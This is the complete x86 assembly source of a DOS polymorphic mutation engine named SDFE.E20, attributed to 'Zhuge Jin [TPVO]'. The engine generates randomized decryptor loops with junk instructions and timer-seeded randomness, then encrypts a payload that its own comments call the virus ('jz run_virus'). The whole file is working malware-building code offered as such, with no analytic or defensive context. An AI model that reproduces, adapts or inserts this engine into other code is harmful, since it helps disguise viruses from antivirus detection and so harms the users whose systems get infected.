
;
;               SDFE.E20 by Zhuge Jin [TPVO]
;
;       SDFE.E20 was modified from SDFE20.
;       It has many differences:
;
;Initialise register
; 1) mov reg,xxxxh
; 2) xor reg,reg     \        xor reg,xxxxh
;    sub reg,reg     \        add reg,xxxxh
;    rol reg,xxh     -        or reg,xxxxh
;    rol reg,xxh     /
;    and reg,(xx)xxh /
;Decryptor code
; 1) add [reg(+reg)+((00)00)],xxh
; 2) adc [reg(+reg)+((00)00)],xxh
; 3) xor [reg(+reg)+((00)00)],xxh
; 4) sub [reg(+reg)+((00)00)],xxh
; 5) sbb [reg(+reg)+((00)00)],xxh
;DEC/INC code
; 1) inc(dec) reg (byte,word)
; 2) add(sub) reg,+(-)(00)01h
; 3) lodsb cmpsb scasb
; 4) add reg,xxxxh \/ add reg,xxxxh
;    sub reg,xxxxh /\ sub reg,xxxxh
;    cmp reg,xxxxh
;    jz  run_virus
;    jmp loop
;


prg_bx dw ?
prg_cx dw ?
prg_dx dw ?
prg_ds dw ?

no_cy db ?
reg_typ db ?
inc_typ db ?
        db ?
reg db ?
reg_ext db 00000100b
disp dw ?

j70h_disp dw ?
m80h_disp dw ?
mc0h_disp dw ?

me1_add0 dw ?
me1_add1 dw ?
me1_add2 dw ?
me1_add3 dw ?

mcc1_disp dw ?
mcc2_disp dw ?

xor_id db ?

reg_ext_cod db 03h,05h,06h,07h

cod db 26h,2eh,36h,3eh,91h,98h,0d6h,0ech,0f0h,0f8h,0fah
    db 9bh,9fh,0ceh,0cch,0f5h

push_cod db 06h,0eh,16h,1eh,50h,51h,52h,53h,54h,55h,56h,57h
         db 9ch,0ffh,0ffh,0ffh

int_cod db 01h,04h, 06h,08h, 11h,12h, 2ch,2dh, 34h,3eh, 50h,58h
        db 5dh,5fh, 68h,6fh

jmp_cod db 68h,0e8h,0e9h,0ebh

SDFE:
        cld
        mov cs:prg_bx,bx        ; save para ...
        mov cs:prg_cx,cx
        mov cs:prg_dx,dx
        mov cs:prg_ds,ds

make_again:
        push cs
        pop ds

        xor di,di
        call make_rnd_cod

        push es                 ; init var ...
        push cs
        pop es
        xor ax,ax
        mov cx,0009h
        mov di,OFFSET j70h_disp
        repz stosw
        pop es

        call rnd_b01
        mov ds:inc_typ,al

        xor di,di

        call make_eng1
        call make_eng2

        push es                 ; set return para ...
        pop ds
        mov cx,di
        xor dx,dx
        ret

make_rnd_cod:
        in ax,40h
        add ax,2e4dh
        neg ax
        stosw
        cmp di,0500h
        jb make_rnd_cod
        ret

rnd_b01:
        in al,40h
        xor al,es:[di]
        and al,01h
        ret

rnd_b03:
        in al,40h
        xor al,es:[di]
        and al,03h
        ret

rnd_w03:
        call rnd_b03
        cbw
        ret

rnd_b07:
        in al,40h
        and al,07h
        ret

rnd_w07:
        call rnd_b07
        cbw
        ret

maddi:
        and al,01h
        cbw
        add di,ax
        inc di
        ret

mor_rnd:
        call rnd_b07
        mov dh,al
        test byte ptr ds:reg_typ,01h
        jnz mor_rnd_a
        and dh,00000011b
mor_rnd_a:
        cmp dh,00000100b
        jz mor_rnd
        cmp dh,ds:reg
        jz mor_rnd
        cmp dh,ds:reg_ext
        jz mor_rnd
        ret

mor1:
        call mor_rnd
        shl al,03h
        mov dl,al
        in al,40h
        and al,11000111b
        or al,dl
        ret

mor2:
        call mor_rnd
        mov dl,al
        in al,40h
        and al,11111000b
        or al,dl
        ret

make_eng1:
        call make_tsh_cod

me1_a0:
        cmp di,1024
        jb make_eng1

        call rnd_b07
        cmp al,00000011b        ; set reg ...
        jz me1_a1
        cmp al,00000101b
        jae me1_a1
        jmp me1_a0
me1_a1:
        mov ds:reg,al
        mov ah,al

        call rnd_b01
        jz me1_a3

        call rnd_b01
        and ah,00000110b
        cmp ah,00000110b
        jz me1_a2
        add al,02h
me1_a2:
        mov bx,OFFSET reg_ext_cod
        xlatb
        mov ds:reg_ext,al

me1_a3:
        call make_cfs_cod_2a

        call make_tsh_cod

        call make_cfs_cod_1a

        call make_tsh_cod
        call make_tsh_cod

        call make_ini_cod       ; make init code
        mov ds:me1_add1,di
        stosw

        call make_tsh_cod

        mov ds:me1_add0,di      ; set loop adress

        call make_tsh_cod

        mov ax,word ptr ds:reg
        cmp ah,00000100b
        jz me1_a4
        push ax
        xchg ah,al
        mov word ptr ds:reg,ax
        call make_zero_cod
        pop word ptr ds:reg

me1_a4:
        call make_tsh_cod

        call rnd_b01
        jz me1_a5

        call make_xor_cod1      ; make xor code
        call make_cfs_cod_1b
        call make_tsh_cod
        call make_inc_cod       ; make inc code
        and bp,7fffh
        jmp me1_a6
me1_a5:
        call make_inc_cod       ; make inc code
        call make_tsh_cod
        call make_xor_cod1      ; make xor code
        call make_cfs_cod_1b
        or bp,8000h

me1_a6:
        call make_tsh_cod

        mov al,81h              ; cmp reg,xxxxh
        stosb
        mov al,11111000b
        or al,ds:reg
        stosb
        mov ds:me1_add2,di
        stosw

        call make_tsh_nocy      ; no carry trash code ???

        mov al,74h              ; jz xxxxh
        stosw
        mov ds:me1_add3,di

        call make_tsh_cod

        mov al,0e9h             ; jmp xxxxh
        stosb
        mov ax,ds:me1_add0
        sub ax,di
        dec ax
        dec ax
        stosw

        call make_tsh_cod

        mov bx,ds:me1_add3
        mov ax,di
        sub ax,bx
        mov es:[bx-01h],al
        cmp al,80h
        jb me1_a7
        pop ax
        jmp make_again
me1_a7:
        ret

make_cfs_cod_1a:
        call rnd_b01
        or al,0c6h              ; mov [xxxxh],xx(xx)h
        mov ah,00000110b
        stosw
        mov ds:mcc1_disp,di
        stosw
        call maddi
        ret

make_cfs_cod_1b:
        mov bx,ds:mcc1_disp
        lea si,[di-04h]
        mov ax,si
        add ax,ds:prg_bx
        mov es:[bx],ax
        mov ax,es:[si]
        test byte ptr es:[bx-02h],01h
        jnz mcc1b_a
        xchg al,es:[bx+02h]
        mov es:[si],al
        ret
mcc1b_a:
        xchg ax,es:[bx+02h]
        mov es:[si],ax
        ret

mcc2_cod db 00110110b,00110110b ;xor/xor
         db 00110110b,00110110b ;xor/xor
         db 00000110b,00101110b ;add/sub
         db 00101110b,00000110b ;sub/add

make_cfs_cod_2a:
        call rnd_b03
        add al,al
        mov ah,al
        mov bx,OFFSET mcc2_cod
        xlatb
        xchg ah,al
        inc ax
        xlatb
        mov ds:[mcc2b_buff+01h],al
        call rnd_b03
        or al,80h
        stosw
        mov ds:mcc2b_buff,al
        mov ds:mcc2_disp,di
        stosw
        cmp al,81h
        jnz mcc2a_a
        inc di
mcc2a_a:
        inc di
        ret

make_cfs_cod_2b:
        mov bx,ds:mcc2_disp
        mov si,OFFSET me1_add0
        call rnd_w03
        add ax,ax
        add si,ax
        mov ax,ds:[si]
        dec ax
        dec ax
        mov word ptr ds:[mcc2b_buff+02h],ax
        add ax,ds:prg_bx
        mov es:[bx],ax
        mov ax,es:[bx+02h]
        cmp byte ptr ds:mcc2b_buff,81h
        jz mcc2b_a1
        mov ah,90h
mcc2b_a1:
        mov word ptr ds:[mcc2b_buff+04h],ax
        jmp mcc2b_a2
mcc2b_a2:

        db 26h                  ; es:

mcc2b_buff db 90h,90h,90h,90h,90h,90h

        ret

make_xor_cod1:
        call rnd_b07
        add al,al
        mov ds:xor_id,al
        cmp al,08h
        jb mxc1_a1
        call rnd_b01             ; clc/stc
        or al,0f8h
        stosb
        mov ds:xor_buf,al
        call make_tsh_nocy
mxc1_a1:
        call rnd_b01
        add al,al
        or al,80h
        stosb
mxc1_a2:
        in al,40h
        and al,11000000b
        cmp al,11000000b
        jz mxc1_a2
        mov dl,al
        mov al,ds:xor_id
        mov ah,al
        mov bx,OFFSET xor_cod1
        xlatb
        xchg ah,al
        inc ax
        xlatb
        xchg ah,al
        mov ds:[xor_buf+01h],ah
        or al,dl
        call make_bx_cod
        in al,40h
        stosb
        mov ds:[xor_buf+02h],al
        ret

xor_cod1 db 00000000b,2ch ; add/sub
         db 00101000b,04h ; sub/add
         db 00110000b,34h ; xor
         db 00110000b,34h ; xor
         db 00010000b,1ch ; adc/sbb
         db 00011000b,14h ; sbb/adc
         db 00010000b,1ch ; adc/sbb
         db 00011000b,14h ; sbb/adc

make_bx_cod:
        mov ah,ds:reg
        cmp byte ptr ds:reg_ext,00000100b
        jz mbc_a
        add ah,ds:reg_ext
        sub ah,09h
        mov byte ptr ds:reg_ext,00000100b
        jmp mbc_a2
mbc_a:
        cmp ah,00000101b
        jz mbc_a1
        xor ah,00000010b
        cmp ah,01h
        jnz mbc_a2
        mov ah,00000111b
        jmp mbc_a2
mbc_a1:
        mov ah,00000110b
        test al,11000000b
        jnz mbc_a2
        or al,01000000b
mbc_a2:
        or al,ah
        stosb
        mov ah,al
        push ax
        and ah,11000000b
        mov al,ah
        cmp ah,00h
        jz mbc_a4
        cmp ah,01000000b
        jz mbc_a3
        in ax,40h
        jmp mbc_a4
mbc_a3:
        mov ah,00h
        in al,40h
        cmp al,80h
        jb mbc_a4
        mov ah,0ffh
mbc_a4:
        mov es:[di],ax
        mov ds:disp,ax
        pop ax
        shr al,06h
        cbw
        add di,ax
        ret

mnc_tab dw OFFSET mnc1,OFFSET mnc2,OFFSET mnc3,OFFSET mnc3

ini1_cod db 29h,2bh,31h,33h
ini2_cod db 11000000b,11001000b,11110000b,11001000b

make_ini_cod:
        call rnd_w03
        mov si,ax
        add si,si
        jmp ds:mnc_tab[si]

mnc1:
        call make_zero_cod
mnc1_a:
        call make_tsh_cod
        mov al,81h
        stosb
        call rnd_b03
        mov bx,OFFSET ini2_cod
        xlatb
        or al,ds:reg
        stosb
        ret

mnc2:
        mov al,ds:reg
        or al,0b8h
        stosb
        ret

mnc3:
        call rnd_b07
        cmp al,00000100b
        jb mnc3_a
        cmp al,00000111b
        jz mnc3
        mov ah,al
        shl ah,03h
        or ah,11000000b
        or ah,ds:reg
        mov al,0c1h
        stosw
        in al,40h
        or al,10h
        stosb
        jmp mnc1_a
mnc3_a:
        call rnd_b01
        cbw
        add ax,ax
        add ax,0e081h
        or ah,ds:reg
        stosw
        push ax
        xor ax,ax
        stosw
        pop ax
        cmp al,83h
        jnz mnc3_ab
        dec di
mnc3_ab:
        jmp mnc1_a

make_zero_cod:
        call rnd_b03
        mov bx,OFFSET ini1_cod
        xlatb
        stosb
        mov al,ds:reg
        mov ah,al
        shl ah,03h
        or al,ah
        or al,11000000b
        stosb
        ret

mic_tab dw OFFSET mic1,OFFSET mic2,OFFSET mic3,OFFSET mic4

mic_cod db 11000000b,05h,11101000b,2dh

inc_cod db 0a6h,0a6h,0ach,0aeh

mic1_a:
        mov cx,word ptr ds:inc_typ
        xor cx,0001h
        add cx,cx
        dec cx
        call make_mic_b2
        stosb
        mov byte ptr ds:mic1_a_buf,ah
        in ax,40h
        stosw
        mov word ptr ds:[mic1_a_buf+01h],ax
        push cx
        call make_tsh_cod
        pop cx
        call make_mic_b2
        stosb
        mov byte ptr ds:[mic1_a_buf+03h],ah
        stosw
        mov word ptr ds:[mic1_a_buf+04h],ax
mic_ab1:
        xor ax,ax

mic1_a_buf db 90h,90h,90h,90h,90h,90h

        cmp ax,cx
        jz mic_ab2
        inc word ptr es:[di-02h]
        inc word ptr ds:[mic1_a_buf+04h]
        jmp mic_ab1
mic_ab2:
        ret

make_mic_b2:
        mov al,81h
        stosb
        call rnd_b01
        cbw
        add ax,ax
        add ax,OFFSET mic_cod
        mov si,ax
        mov ax,ds:[si]
        or al,ds:reg
        ret

make_inc_cod:
        call rnd_w03
        mov si,ax
        add si,si
        jmp ds:mic_tab[si]

mic1:
        call rnd_b01
        jz mic1_a
        mov al,ds:inc_typ
        shl al,03h
        or al,40h
        or al,ds:reg
        stosb
        ret

mic2:
        call rnd_b03
        or al,81h
        mov ah,11000000b
        or ah,ds:reg
        test byte ptr ds:inc_typ,01h
        jz mic2_a1
        or ah,00101000b
mic2_a1:
        stosw
        cmp al,83h
        jnz mic2_a2
        test si,0001h
        jnz mic2_a2
        mov al,0ffh
        xor byte ptr ds:inc_typ,01h
        jmp mic2_a3
mic2_a2:
        mov ax,0001h
mic2_a3:
        stosw
        cmp byte ptr es:[di-04h],81h
        jz mic2_a4
        dec di
mic2_a4:
        ret

mic3:
        mov al,0ffh
        mov ah,ds:inc_typ
        shl ah,03h
        or ah,11000000b
        or ah,ds:reg
        stosw
        ret

mic4:
        test byte ptr ds:inc_typ,01h
        jz mic4_a
        mov al,0fdh             ; std
        stosb
        call make_tsh_cod
mic4_a:
        mov al,ds:reg
        cmp al,00000110b
        jb make_inc_cod
        call mic4_b
        ret
mic4_b:
        and al,01h
        and ah,00000010b
        xor al,ah
        mov bx,OFFSET inc_cod
        xlatb
        stosb
        ret

make_tsh_nocy:
        mov byte ptr ds:no_cy,01h
        call make_tsh_cod
        mov byte ptr ds:no_cy,00h
        ret

mtc_70h:
        mov si,ds:j70h_disp
        cmp si,0000h
        jz mtc_70h_a
        mov ax,di
        sub ax,si
        cmp ax,0000h
        jz mtc_70h_a
        mov es:[si-01h],al
        mov word ptr ds:j70h_disp,0000h
mtc_70h_a:
        ret

mtc_80h:
        mov bx,OFFSET m80h_disp
        call set_disp
        ret

mtc_c0h:
        mov bx,OFFSET mc0h_disp
        call set_disp
        ret

set_disp:
        mov si,ds:[bx]
        cmp si,0000h
        jz sd_a
        mov ax,di
        add ax,ds:prg_bx
        mov es:[si],ax
        mov word ptr ds:[bx],0000h
sd_a:
        ret

make_tsh_cod:
        call rnd_w03
        mov cx,ax
        adc cx,0003h
mtc_loop:
        cmp byte ptr ds:no_cy,01h
        jnz mtc_la1
        call mtc5
        jmp mtc_la2
mtc_la1:
        call mtc
mtc_la2:
        call mtc_70h
        loop mtc_loop
        mov word ptr ds:j70h_disp,0000h
        ret

mtc:
        add ax,es:[di]
        neg ax
        mov ds:reg_typ,al

        cmp al,0a8h             ; test al,xxh
        jz mtc1_a1
        cmp al,0a9h             ; test ax,xxxxh
        jz mtc1_a2b6
        cmp al,0a0h
        jz mtc1_a2b6
        cmp al,0a1h
        jz mtc1_a2b6

        cmp al,40h
        jae mtc2

mtc1:
        mov ah,al               ; 04h , 05h ...
        and al,07h
        cmp al,04h
        jb mtc1_a2

        and ah,11111101b
        mov al,ah

mtc1_a1:
        stosb
        call maddi
        ret

mtc1_a2:
        cmp ah,38h
        jae mtc1_a2b1
        or ah,02h
mtc1_a2b1:
        call mor1
        mov dl,al
        and dl,11000000b
        cmp dl,11000000b
        jnz mtc1_a2b2
        xchg ah,al
        stosw
        ret
mtc1_a2b2:
        cmp dl,00h
        jnz mtc1_a2b5
mtc1_a2b3:
        and al,00111000b
        or al,00000110b
        xchg ah,al
        stosw
mtc1_a2b4:
        in ax,40h
        cmp ax,0ffffh
        jz mtc1_a2b4
        stosw
        ret
mtc1_a2b5:
        test ah,01h
        jnz mtc1_a2b3
        xchg ah,al
        stosw
        mov al,ah
        shr al,06h
        cbw
        add di,ax
        ret
mtc1_a2b6:
        stosb
        jmp mtc1_a2b4

mtc3_:
        jmp mtc3

mtc2:
        cmp al,70h
        jae mtc3_
        cmp al,60h
        jae mtc2_a2
        cmp al,50h
        jae mtc2_a3

mtc2_a1:
        mov byte ptr cs:reg_typ,01h
        call mor2
        and al,1fh
        or al,40h
        cmp al,50h
        jae mtc2_a1b1
        stosb
        ret
mtc2_a1b1:
        in al,40h
        and al,0fh
        mov bx,OFFSET push_cod
        xlatb
        stosb
        cmp al,0ffh
        jnz mtc2_a1b2
        call mor2
        and al,03h
        or al,11110000b
        stosb
mtc2_a1b2:
        call mtc5_a1
        mov byte ptr cs:reg_typ,01h
        call mor2
        and al,47h
        test al,40h
        jz mtc2_a1b3
        mov ah,al
        or ah,11000000b
        mov al,8fh
        stosw
        ret
mtc2_a1b3:
        or al,58h
        stosb
        ret

mtc2_a2:
        push cx                 ; int xxh ...
        in ax,40h
        add ah,al
        mov cx,0008h
        mov bx,OFFSET int_cod
mtc2_a2b1:
        mov dx,ds:[bx]
        cmp ah,dl
        jae mtc2_a2b2
        jmp mtc2_a2b3
mtc2_a2b2:
        cmp ah,dh
        jbe mtc2_a2b4
mtc2_a2b3:
        inc bx
        inc bx
        loop mtc2_a2b1
        pop cx
        jmp mtc2_a2
mtc2_a2b4:
        mov al,0cdh
        stosw
        pop cx
        ret

mtc2_a3:
        and al,00001001b
        or al,11110110b
        stosb
        mov bl,al
mtc2_a3b1:
        call rnd_b07
        cmp al,00000110b
        jae mtc2_a3b1
        cmp bl,0feh
        jb mtc2_a3b2
        and al,01h
mtc2_a3b2:
        mov ah,al
        call mor2
        and al,00000111b
        or al,11000000b
        shl ah,03h
        or al,ah
        stosb
        mov al,bl
        cmp al,0feh
        jae mtc2_a3b3
        cmp ah,00010000b
        jae mtc2_a3b3
        call maddi
mtc2_a3b3:
        ret

mtc3:
        cmp al,0a0h
        jae mtc45

        cmp al,80h
        jae mtc3_a2

        in ax,40h
        and al,1fh
        test al,10h
        jnz mtc3_a1

        mov bx,OFFSET cod
        cbw
        add bx,ax
        mov ah,ds:[bx]
        cmp al,0bh
        jae mtc3_a
        call rnd_b01
        add ah,al
mtc3_a:
        mov al,ah
        stosb
        ret

mtc45:
        jmp mtc4

mtc3_a1:
        or al,70h               ; jxx disp ...
        xor ah,ah
        stosw
        mov ds:j70h_disp,di
        ret

mtc3_a2:
        call rnd_b03
        or al,80h
        mov ds:reg_typ,al
        stosb
        push ax
mtc3_a2b1:
        call mor2
        mov ah,al
        and ah,11000000b
        cmp ah,11000000b
        jz mtc3_a2b4
        cmp ah,00000000b
        jz mtc3_a2b2
        jmp mtc3_a2b1
mtc3_a2b2:
        and al,00111000b
        or al,00000110b
        stosb
        mov ds:m80h_disp,di
        call rnd_w07
        sub ax,000ah
        add ax,ds:me1_add0
        cmp word ptr ds:me1_add0,0000h
        jnz mtc3_a2b3
        mov ax,di
mtc3_a2b3:
        add ax,ds:prg_bx
        stosb
        mov al,ah
mtc3_a2b4:
        stosb
        pop ax
        cmp al,81h
        jnz mtc3_a2b5
        call mtc_c0h
        call mtc_80h
        inc di
mtc3_a2b5:
        inc di
        ret

mtc4:
        cmp al,0c0h
        jb mtc5

        cmp al,0d0h
        jb mtc4_a1
        cmp al,0e0h
        jb mtc4_a2
        cmp al,0e4h
        jb mtc4_a3

        jmp mtc5

mtc4_a1:
        mov ah,al
        and ah,11110001b
        call mor2
        or al,11000000b
        xchg ah,al
        stosw
        inc di
        ret

mtc4_a2:
        mov ah,al
        and ah,11110011b
        call mor2
        or al,11000000b
        xchg ah,al
        stosw
        ret

mtc4_a3:
        xor ah,ah
        stosw
        mov ds:j70h_disp,di
        ret

mtc5:
        call rnd_b07
        cmp al,02h
        jz mtc5_a2
        cmp al,03h
        jz mtc5_a3

mtc5_a1:
        call rnd_b01
        jz mtc5_a1b1
        jmp mtc5_a4

mtc5_a1b1:
        call mor2               ; mov reg,xx(xx)h
        and al,00000111b
        test byte ptr ds:reg_typ,01h
        jz mtc5_a1b2
        or al,00001000b
mtc5_a1b2:
        or al,0b0h
        stosb
        cmp al,0b8h
        jb mtc5_a1b3
        call mtc_80h
        call mtc_c0h
        inc di
mtc5_a1b3:
        inc di
        ret

mtc5_a2:
        call rnd_b01
        or al,0c6h
        mov ah,00000110b
        stosw
        mov ds:mc0h_disp,di
        push ax
        call rnd_w07
        sub ax,000ah
        add ax,ds:me1_add0
        cmp word ptr ds:me1_add0,0000h
        jnz mtc5_a2b
        mov ax,di
mtc5_a2b:
        add ax,ds:prg_bx
        stosw
        pop ax
        call maddi
        ret

mtc5_a3:
        call rnd_b03
        mov bx,OFFSET jmp_cod
        xlatb
        stosb
        cmp al,68h
        jz mtc5_a3b3
        push ax
        call rnd_w07
        inc ax
        inc ax
        stosw
        push ax
        call mtc_c0h
        call mtc_80h
        pop ax
        add di,ax
        pop ax
        cmp al,0e8h
        jnz mtc5_a3b1
        mov byte ptr ds:reg_typ,01h
        call mor2
        and al,00000111b
        or al,58h
        stosb
mtc5_a3b1:
        cmp al,0ebh
        jnz mtc5_a3b2
        dec di
mtc5_a3b2:
        ret
mtc5_a3b3:
        push di
        inc di
        inc di
        call mtc5_a1
        call rnd_b01
        or al,0c2h
        stosb
        cmp al,0c3h
        jz mtc5_a3b4
        xor ax,ax
        stosw
mtc5_a3b4:
        pop si
        call rnd_w07
        add di,ax
        mov ax,di
        add ax,ds:prg_bx
        mov es:[si],ax
        jmp mtc5_a3b2

mtc5_a4:
        call rnd_b03
        add al,88h
        stosb
        mov ds:reg_typ,al
        cmp al,8ah
        jb mtc5_a4b1
        call mor1
        jmp mtc5_a4b2
mtc5_a4b1:
        call mor2
mtc5_a4b2:
        or al,11000000b
        stosb
        ret

make_eng2:
        mov bx,ds:me1_add1
        test byte ptr ds:inc_typ,01h
        jz me2_a1
        mov bx,ds:me1_add2
me2_a1:
        call set_count

        mov cx,ds:prg_cx
        lds si,dword ptr ds:prg_dx

me2_a:
        lodsb

xor_buf db 90h,90h,90h

        stosb
        loop me2_a

        push cs
        pop ds

        mov bx,ds:me1_add2
        test byte ptr ds:inc_typ,01h
        jz me2_a3
        mov bx,ds:me1_add1
me2_a3:
        call set_count

        call make_cfs_cod_2b

        ret

set_count:
        mov ax,di
        add ax,ds:prg_bx
        sub ax,ds:disp
        mov dx,word ptr ds:inc_typ
        sub ax,dx
        test bp,8000h
        jz sc_a
        add ax,dx
        add ax,dx
        dec ax
sc_a:
        mov es:[bx],ax
        ret

SDFE_E:

